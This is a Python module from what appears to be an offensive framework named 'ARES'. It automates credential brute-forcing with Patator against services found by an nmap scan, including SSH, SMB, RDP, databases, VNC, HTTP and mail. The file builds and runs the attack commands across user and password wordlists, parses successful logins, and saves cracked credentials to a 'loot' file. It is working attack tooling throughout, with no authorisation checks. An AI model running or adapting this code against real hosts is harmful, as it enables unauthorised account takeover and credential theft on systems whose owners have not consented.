"""
ARES - Brute Force Module
Credential brute-forcing with Patator.
"""
import os
import re
from modules.base import BaseModule
from core.utils import run_command, run_command_live, parse_nmap_service, count_lines
from core import logger


class BruteForceModule(BaseModule):
    name = "bruteforce"
    description = "Credential brute-forcing with Patator (SSH, FTP, SMB, HTTP...)"
    required_tools = ["patator"]
    phase = 2

    # Maps normalized service name → patator module + ignore pattern for failed attempts
    PATATOR_MODULES = {
        "ssh":      {"module": "ssh_login",    "ignore": "mesg='Authentication failed'"},
        "ftp":      {"module": "ftp_login",    "ignore": "mesg='Login incorrect'"},
        "smb":      {"module": "smb_login",    "ignore": "fmesg='STATUS_LOGON_FAILURE'"},
        "rdp":      {"module": "rdp_login",    "ignore": "fmesg='Authentication failure'"},
        "mysql":    {"module": "mysql_login",  "ignore": "fmesg='Access denied'"},
        "mssql":    {"module": "mssql_login",  "ignore": "fmesg='Login failed'"},
        "postgres": {"module": "pgsql_login",  "ignore": "fmesg='password authentication failed'"},
        "vnc":      {"module": "vnc_login",    "ignore": "fmesg='Authentication failed'"},
        "telnet":   {"module": "telnet_login", "ignore": "egrep='Login incorrect'"},
        "http-get": {"module": "http_fuzz",    "ignore": "code=401"},
        "pop3":     {"module": "pop3_login",   "ignore": "mesg='Authentication failed'"},
        "imap":     {"module": "imap_login",   "ignore": "mesg='LOGIN failed'"},
        "smtp":     {"module": "smtp_login",   "ignore": "fmesg='Authentication credentials invalid'"},
    }

    def run(self, context: dict) -> dict:
        results = {
            "credentials": [],
            "attempted_services": [],
            "raw_files": [],
        }

        logger.info("Tool: patator — modular multi-protocol brute-forcer")
        logger.info("Protocols: SSH · FTP · SMB · RDP · MySQL · PostgreSQL · VNC · HTTP · POP3 · IMAP · SMTP")

        targets = self._identify_targets(context)
        if not targets:
            logger.warning("No brute-forceable services detected from nmap results.")
            return results

        target_list = ", ".join(f"{t['service']}:{t['port']}" for t in targets)
        logger.info(f"Targets: {target_list}")

        if not os.path.isfile(self.config.wordlist_users):
            logger.warning(f"User wordlist not found: {self.config.wordlist_users}")
            return results
        if not os.path.isfile(self.config.wordlist_passwords):
            logger.warning(f"Password wordlist not found: {self.config.wordlist_passwords}")
            return results

        logger.info(f"Wordlist users    : {self.config.wordlist_users}")
        logger.info(f"Wordlist passwords: {self.config.wordlist_passwords}")

        for target in targets:
            service = target["service"]
            port = target["port"]
            mod = target["patator_module"]
            ignore = target["ignore"]

            logger.info(f"Attacking {service}:{port} → patator {mod}")
            creds, outfile = self._run_patator(mod, port, ignore, service)

            if outfile:
                results["raw_files"].append(outfile)

            results["attempted_services"].append({
                "service": service,
                "port": port,
                "found": len(creds),
            })

            if creds:
                results["credentials"].extend(creds)
                for c in creds:
                    logger.finding(
                        f"CREDENTIAL FOUND: {c['service']} — {c['username']}:{c['password']}",
                        f"Port {c['port']}",
                        severity="critical",
                    )
                    loot_file = os.path.join(self.config.output_dir, "loot", "credentials.txt")
                    with open(loot_file, "a") as f:
                        f.write(f"{c['service']}:{c['port']} — {c['username']}:{c['password']}\n")

        if not results["credentials"]:
            logger.info("No credentials found.")

        return results

    def _identify_targets(self, context: dict) -> list:
        targets = []
        for port_info in context.get("nmap", {}).get("ports", []):
            service = port_info.get("service", "")
            port_num = port_info.get("port", 0)
            normalized = parse_nmap_service(service)
            if (
                normalized
                and normalized in self.PATATOR_MODULES
                and normalized in self.config.brute_services
            ):
                mod_info = self.PATATOR_MODULES[normalized]
                targets.append({
                    "service": normalized,
                    "port": port_num,
                    "patator_module": mod_info["module"],
                    "ignore": mod_info["ignore"],
                })
        return targets

    def _run_patator(self, module: str, port: int, ignore: str, service: str) -> tuple:
        """Build and run patator command. Returns (credentials, outfile)."""
        outfile = os.path.join(self.output_path, f"patator_{service}_{port}.txt")
        threads = min(self.config.threads, 4)

        # Limit password list to first 500 in normal mode
        pw_list = self.config.wordlist_passwords
        if self.config.intensity != "aggressive":
            pw_head = os.path.join(self.output_path, f"passwords_{port}.txt")
            run_command(f"head -500 {self.config.wordlist_passwords} > {pw_head}")
            if os.path.isfile(pw_head):
                pw_list = pw_head

        # Show combination count so the user knows what to expect
        n_users = count_lines(self.config.wordlist_users)
        n_pws = count_lines(pw_list)
        total_combos = n_users * n_pws if module != "vnc_login" else n_pws
        if module == "vnc_login":
            logger.info(f"  Combinations: {n_pws:,} passwords")
        else:
            logger.info(f"  Combinations: {n_users} users × {n_pws} passwords = {total_combos:,}")

        proxy_arg = f"proxy={self.config.proxy}" if self.config.proxy else ""

        if module == "http_fuzz":
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{self.config.target_ip}:{port}/"
            cmd = (
                f"patator http_fuzz url={url} "
                f"user_pass=FILE0:FILE1 "
                f"0={self.config.wordlist_users} 1={pw_list} "
                f"{proxy_arg} "
                f"-t {threads} -x {ignore} --max-retries=1"
            )
        elif module == "vnc_login":
            cmd = (
                f"patator vnc_login "
                f"host={self.config.target_ip} port={port} "
                f"password=FILE0 0={pw_list} "
                f"-t {threads} -x {ignore} --max-retries=1"
            )
        else:
            cmd = (
                f"patator {module} "
                f"host={self.config.target_ip} port={port} "
                f"user=FILE0 password=FILE1 "
                f"0={self.config.wordlist_users} 1={pw_list} "
                f"-t {threads} -x {ignore} --max-retries=1"
            )

        logger.info(f"  $ {cmd}")

        attempt = [0]

        def _on_line(line):
            if "INFO -" in line:
                attempt[0] += 1
                if attempt[0] % 50 == 0:
                    logger.info(f"  [{attempt[0]:,}/{total_combos:,}] trying...")

        result = run_command_live(cmd, timeout=300, on_line=_on_line)
        logger.info(f"  [{attempt[0]:,}/{total_combos:,}] done")

        raw = result.get("stdout", "")
        with open(outfile, "w") as f:
            f.write(raw)

        return self._parse_output(raw, service, port), outfile

    def _parse_output(self, output: str, service: str, port: int) -> list:
        """
        Parse patator stdout for successful credentials.
        Patator prints non-ignored results as:
          TIMESTAMP patator INFO - CODE SIZE TIME | FILE0 FILE1 | id | mesg
        """
        creds = []
        for line in output.splitlines():
            if "INFO -" not in line:
                continue
            parts = line.split("|")
            if len(parts) < 2:
                continue
            payload = parts[1].strip()
            tokens = payload.split()
            if len(tokens) == 2:
                creds.append({
                    "service": service,
                    "port": port,
                    "username": tokens[0],
                    "password": tokens[1],
                    "host": self.config.target_ip,
                })
            elif len(tokens) == 1 and service == "vnc":
                creds.append({
                    "service": service,
                    "port": port,
                    "username": "",
                    "password": tokens[0],
                    "host": self.config.target_ip,
                })
        return creds
